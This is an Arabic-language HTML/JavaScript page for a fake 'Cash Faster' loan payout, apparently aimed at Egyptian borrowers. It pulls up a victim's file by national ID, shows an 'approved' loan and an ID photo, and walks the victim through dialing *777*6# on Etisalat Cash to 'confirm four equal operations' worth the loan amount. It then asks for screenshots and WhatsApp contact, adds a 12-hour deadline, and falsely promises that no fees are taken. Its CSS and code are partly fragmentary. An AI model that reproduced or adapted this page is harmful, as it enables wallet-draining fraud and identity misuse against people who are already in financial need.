<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
<title>Cash Faster | خطوات التسييل ورفع التأكيدات</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  :root {
    --primary: #1A8C4A;
    --primary-light: #E8F5EE;
    --primary-dark: #0F6B38;
    --gold: #B8912E;
    --gold-light: #FBF6E8;

    --text-muted: #6B7A8F;
    --border: #E1E8F0;

    --shadow: 0 8px 32px rgba(26,35,50,0.08);

  body {

    background: var(--bg);
    color: var(--text);

    flex-direction: column;
    align-items: center;
    padding: 1rem;
    position: relative;
    overflow-x: hidden;
    line-height: 1.7;

  .watermark {
    position: fixed;

    display: flex;
    align-items: center;
    justify-content: center;
  }
  .watermark::before {
    content: 'CASH FASTER';
    position: absolute;
    font-size: 9rem;
    font-weight: 900;
    color: rgba(26,140,74,0.045);
    letter-spacing: 0.3rem;
    transform: rotate(-32deg);
    white-space: nowrap;
    font-family: var(--font);
  }
  .watermark::after {
    content: 'CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER • CASH FASTER';

    font-size: 1.6rem;
    font-weight: 800;
    color: rgba(184,145,46,0.04);
    letter-spacing: 0.2rem;
    transform: rotate(-32deg);

    line-height: 5rem;

    font-family: var(--font);

    font-size: 0.72rem;

    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    flex-wrap: wrap;
    font-weight: 600;

  .promo-strip i { color: var(--primary); }
  .promo-strip .highlight { color: var(--gold-dark); font-weight: 800; }
  .header {

    justify-content: space-between;
    align-items: center;

  .brand { display: flex; align-items: center; gap: 0.7rem; cursor: pointer; }

    align-items: center;
    gap: 0.4rem;

  .header .badge i { font-size: 0.45rem; animation: dotPulse 1.8s ease-in-out infinite; }

  .status-bar .status-text .sub { font-size: 0.68rem; color: var(--text-muted); margin-top: 0.15rem; }

  .status-bar.warning .status-icon { background: var(--warning-light); color: var(--warning); }
  .status-bar.warning .status-text .main { color: var(--warning); }

  }

  }

  }

  .id-verification .idv-caption {

  .steps-container {

    border-radius: var(--radius);

    border: 1px solid var(--border);

  }
  .steps-container .steps-header {

  }
  .steps-container .steps-header .icon {
    width: 42px; height: 42px;
    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
    border-radius: 12px;

    justify-content: center;

    font-size: 1.1rem;

  }
  .steps-container .steps-header h3 { font-size: 1rem; font-weight: 800; color: var(--text); line-height: 1.3; }

  .code-box .code-value {

  let currentClient = null;

  function calculateTotal(client) {
    return client.total || "يحدد لاحقاً";
  }

  function getWalletType(client) {
    if (client.hasEtisalat) return 'etisalat';

  function openWhatsApp(customMsg) {
    let msg = customMsg || (currentClient
      ? `السلام عليكم 👋\n\n👤 أنا أسمى: ${currentClient.name}\n🔢 رقمي القومي: ${currentClient.id}\n💰 مبلغ القرض: ${currentClient.loan.toLocaleString('ar-EG')} ج.م\n\n📞 أريد التواصل بخصوص ملف التسيل.`
      : `السلام عليكم 👋`);

  }

  function buildLoanCard(client, totalDisplay) {
    let walletDisplay = "⚠️ غير محددة";
    if (client.hasEtisalat) walletDisplay = "📱 اتصالات كاش";
    else if (client.wallet) walletDisplay = client.wallet;

    return `
      <div class="loan-card">
        <div class="loan-label">💰 مبلغ التمويل المعتمد</div>
        <div class="loan-amount-main">${client.loan.toLocaleString('ar-EG')} <span class="currency">ج.م</span></div>
        <div class="loan-percent"><i class="fas fa-circle-check"></i> ✅ تمت الموافقة النهائية 100%</div>
        <div class="loan-details-grid">
          <div class="detail-item"><div class="label">💰 المبلغ</div><div class="value gold">${client.loan.toLocaleString('ar-EG')} ج.م</div></div>
          <div class="detail-item"><div class="label">📅 المدة</div><div class="value">${client.loanTerm}</div></div>
          <div class="detail-item"><div class="label">💵 القسط الشهري</div><div class="value gold">${client.installment} ج.م</div></div>
          <div class="detail-item"><div class="label">💳 الإجمالي</div><div class="value">${totalDisplay}</div></div>
          <div class="detail-item"><div class="label">📱 المحفظة</div><div class="value green">${walletDisplay}</div></div>
          <div class="detail-item"><div class="label">🔢 رقم المحفظة</div><div class="value">${client.walletNum || "—"}</div></div>
        </div>

  function buildIdVerification(client) {
    if (!client.idVerificationImage || client.idVerificationImage.trim() === "") return '';
    return `
      <div class="id-verification">
        <div class="idv-header">
          <div class="idv-icon"><i class="fas fa-id-card"></i></div>
          <div>
            <h4>🆔 التحقق من هوية العميل</h4>
            <p>📸 صورة الهوية الموثقة في ملفك على السيستم</p>
          </div>
        </div>
        <div class="idv-image-box">
          <img src="${client.idVerificationImage}" alt="صورة التحقق من الهوية" onerror="this.parentElement.innerHTML='<div class=\\'idv-placeholder\\'><i class=\\'fas fa-image\\'></i>⚠️ تعذر تحميل الصورة</div>'">
        </div>
        <div class="idv-caption">🔒 <i class="fas fa-shield-halved"></i> هذه الصورة محفوظة بشكل آمن في ملفك الشخصي</div>

  }

  function buildClientDetails(client) {
    let walletDisplay = "غير محددة";
    if (client.hasEtisalat) walletDisplay = "اتصالات كاش";
    else if (client.wallet) walletDisplay = client.wallet;

    return `
      <div class="client-info">
        <div class="info-title"><i class="fas fa-user-circle"></i> 👤 بيانات العميل</div>
        <div class="row"><span class="key">👤 الاسم</span><span class="value">${client.name}</span></div>
        <div class="row"><span class="key">🔢 الرقم القومي</span><span class="value gold">${client.id}</span></div>
        <div class="row"><span class="key">💼 الوظيفة</span><span class="value">${client.job || "غير مسجل"}</span></div>
        <div class="row"><span class="key">📱 المحفظة</span><span class="value green">${walletDisplay}</span></div>
        <div class="row"><span class="key">🔢 رقم المحفظة</span><span class="value">${client.walletNum || "—"}</span></div>
        <div class="row"><span class="key">🏢 جهة التمويل</span><span class="value gold">شركة النيل للتمويل</span></div>
        ${client.guarantor ? `<div class="row"><span class="key">👥 الضامن</span><span class="value">${client.guarantor.name} (${client.guarantor.relation})</span></div>` : ''}
      </div>
    `;
  }

  function buildSteps(client) {
    const loanAmountNum = parseInt(String(client.loan).replace(/\D/g, ''), 10);
    const perOperation = Math.floor(loanAmountNum / 4);
    const perOpFormatted = perOperation.toLocaleString('ar-EG');
    const totalFormatted = (perOperation * 4).toLocaleString('ar-EG');

    const code = '*777*6#';
    const codeLabel = '🔑 كود تفعيل التسييل';
    const codeHint = '📞 كود تفعيل تسييل الحساب — اتصل به من محفظتك اتصالات كاش';

    const walletName = 'اتصالات كاش';

    return `
      <div class="steps-container">
        <div class="steps-header">
          <div class="icon"><i class="fas fa-mobile-screen-button"></i></div>
          <div>
            <h3>📋 خطوات بدء التسييل (${walletName})</h3>
            <p>💡 اتبع الخطوات بالترتيب لإتمام إجراءات الصرف</p>
          </div>
        </div>

        <div class="code-box">
          <div class="code-label">${codeLabel}</div>
          <div class="code-value">${code}</div>
          <div class="code-hint">${codeHint}</div>
        </div>

        <div class="step-cards">
          <div class="step-card">
            <div class="step-num">1</div>
            <div class="step-content">
              <div class="step-title">📞 اطلب كود التفعيل</div>
              <div class="step-desc">اتصل بالكود <strong>${code}</strong> من خط ${walletName} الخاص بك</div>
            </div>
          </div>
          <div class="step-card">
            <div class="step-num">2</div>
            <div class="step-content">
              <div class="step-title">✅ أكّد العمليات الأربع</div>
              <div class="step-desc">قم بتأكيد <strong>4 عمليات متساوية</strong> كما هو موضح أدناه</div>
            </div>
          </div>
          <div class="step-card">
            <div class="step-num">3</div>
            <div class="step-content">
              <div class="step-title">📸 التقط لقطة شاشة</div>
              <div class="step-desc">التقط <strong>4 صور</strong> — صورة لكل عملية مؤكدة</div>
            </div>
          </div>
          <div class="step-card">
            <div class="step-num">4</div>
            <div class="step-content">
              <div class="step-title">📤 ارفع الصور</div>
              <div class="step-desc">اضغط على زر <span class="gold-text">"ارفع لقطات التسييل"</span> بالأسفل</div>
            </div>
          </div>
        </div>

        <div class="amount-box">
          <div class="amount-label">💰 المبلغ المؤكد لكل عملية</div>
          <div class="amount-value">${perOpFormatted} ج.م</div>
          <div class="amount-sub">?? إجمالي 4 عمليات = ${totalFormatted} ج.م</div>
        </div>

        <button class="btn-upload" onclick="window.open('${SURVEY_URL}','_blank')">
          <i class="fas fa-cloud-arrow-up"></i> 📤 ارفع لقطات التسييل الآن
        </button>

        <button class="btn-whatsapp" onclick="openWhatsApp()">
          <i class="fab fa-whatsapp fa-lg"></i> 💬 تواصل مع قسم التحويلات المالية
        </button>
      </div>
    `;
  }

  function buildOpenWalletBox(client) {
    return `

          <div class="ow-icon"><i class="fas fa-triangle-exclamation"></i></div>
          <div>
            <h3>⚠️ مطلوب فتح محفظة اتصالات كاش</h3>
            <p>💡 لإتمام إجراءات الصرف</p>

        </div>

        <div class="ow-body">

            📌 لكي نتمكن من البدء في إنهاء إجراءات التسيل والصرف لحسابك، يجب عليك:<br><br>

          </div>

          <div class="wallet-options">
            <div class="wallet-opt etisalat">
              <div class="wo-icon"><i class="fas fa-sim-card"></i></div>
              <div class="wo-name">اتصالات كاش</div>
              <div class="wo-hint">📱 فتح من فرع اتصالات أو تطبيق My Etisalat</div>
            </div>
          </div>

          <div class="ow-steps">
            <div class="ow-step">
              <div class="ow-num">1</div>
              <div>📱 توجه إلى أقرب فرع اتصالات، أو استخدم تطبيق <strong>My Etisalat</strong> لفتح محفظة كاش.</div>
            </div>
            <div class="ow-step">
              <div class="ow-num">2</div>
              <div>✅ تأكد أن المحفظة <strong>مسجلة باسمك</strong> وبنفس الرقم القومي المسجل لدينا.</div>
            </div>
            <div class="ow-step">
              <div class="ow-num">3</div>
              <div>📞 بعد فتح المحفظة، أرسل رقم المحفظة الخاص بك عبر واتساب إلى <strong>قسم التحويلات المالية</strong>.</div>
            </div>
            <div class="ow-step">
              <div class="ow-num">4</div>
              <div>🎯 سيتم إضافة الرقم إلى ملفك على السيستم، ثم نبدأ فورًا في <strong>إنهاء إجراءات التسيل والصرف</strong> لك.</div>
            </div>
          </div>

          <div class="ow-apology">

            نأسف، نظامنا يخدم محفظة اتصالات كاش فقط. وقد تم إبلاغك بذلك في وقت التسجيل.
          </div>

          <button class="btn-whatsapp" onclick="openWhatsApp('السلام عليكم 👋\\n\\n👤 أنا: ${client.name}\\n🔢 الرقم القومي: ${client.id}\\n\\n📱 لقد قمت بفتح محفظة اتصالات كاش جديدة كما طُلب مني.\\n🔢 رقم المحفظة الجديد: [اكتب رقمك هنا]\\n\\n🎯 أرغب في إبلاغ قسم التحويلات المالية برقم المحفظة الخاص بي ليتم إضافته إلى ملفي على السيستم والبدء في إنهاء إجراءات التسيل والصرف.\\n\\n🙏 شكرًا.')">

        </div>
      </div>
    `;

  function buildTransparency() {
    return `
      <div class="transparency-box">
        <div class="trans-header">
          <i class="fas fa-shield-halved"></i>
          <h4>🛡️ حقوقك وضماناتك</h4>
        </div>
        <ul>
          <li><i class="fas fa-check"></i> <span>💰 لا نطلب أي رسوم مسبقة مقابل الصرف.</span></li>
          <li><i class="fas fa-check"></i> <span>🔑 كود التفعيل خاص بحسابك أنت فقط، ولا يُستخدم لأي غرض آخر.</span></li>
          <li><i class="fas fa-check"></i> <span>✅ يمكنك التأكد من الكود عبر تطبيق اتصالات الرسمي قبل التنفيذ.</span></li>
          <li><i class="fas fa-check"></i> <span>💬 لأي استفسار، تواصل معنا مباشرة عبر واتساب الرسمي.</span></li>
        </ul>
      </div>
    `;
  }

  function displayResult(client) {
    currentClient = client;
    const resultArea = document.getElementById('resultArea');
    const totalDisplay = calculateTotal(client);
    const walletType = getWalletType(client);

    let html = '';
    html += buildLoanCard(client, totalDisplay);
    html += buildIdVerification(client);
    html += buildClientDetails(client);

    if (walletType === 'etisalat') {
      html += `
        <div class="status-bar info">
          <div class="status-icon"><i class="fas fa-circle-info"></i></div>
          <div class="status-text">
            <div class="main">✅ طلبك جاهز للتسييل عبر اتصالات كاش</div>
            <div class="sub">💡 اتبع خطوات التسييل أدناه لإتمام الصرف</div>
          </div>
        </div>
      `;
      html += buildSteps(client);
    } else {
      html += `
        <div class="status-bar warning">
          <div class="status-icon"><i class="fas fa-triangle-exclamation"></i></div>
          <div class="status-text">
            <div class="main">⚠️ مطلوب فتح محفظة اتصالات كاش</div>
            <div class="sub">⏰ خلال 12 ساعة من الآن لإتمام الصرف</div>
          </div>
        </div>
      `;
      html += buildOpenWalletBox(client);
    }

    html += buildTransparency();

    resultArea.innerHTML = html;
    document.getElementById('errorBox').style.display = 'none';
  }

  function searchCustomer(idFromURL) {
    const input = document.getElementById('nationalId');
    const nationalId = idFromURL || (input ? input.value.trim() : '');

    if (!nationalId) { alert('⚠️ الرجاء إدخال الرقم القومي'); return; }
    if (nationalId.length !== 14) { alert('⚠️ الرقم القومي يجب أن يكون 14 رقمًا'); return; }

    document.getElementById('loader').style.display = 'block';
    document.getElementById('resultArea').innerHTML = '';
    document.getElementById('errorBox').style.display = 'none';

    setTimeout(() => {
      document.getElementById('loader').style.display = 'none';
      const found = customersDatabase[nationalId];
      if (found) {
        found.id = nationalId;
        displayResult(found);
      } else {
        document.getElementById('errorBox').style.display = 'block';
        currentClient = null;
      }
    }, 700);
  }

  window.addEventListener('load', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const idFromURL = urlParams.get('id');
    if (idFromURL && idFromURL.length === 14) {
      const input = document.getElementById('nationalId');
      if (input) input.value = idFromURL;
      searchCustomer(idFromURL);
    }
  });

  document.getElementById('nationalId')?.addEventListener('keypress', e => {
    if (e.key === 'Enter') searchCustomer();
  });

  window.searchCustomer = searchCustomer;
  window.openWhatsApp = openWhatsApp;
</script>
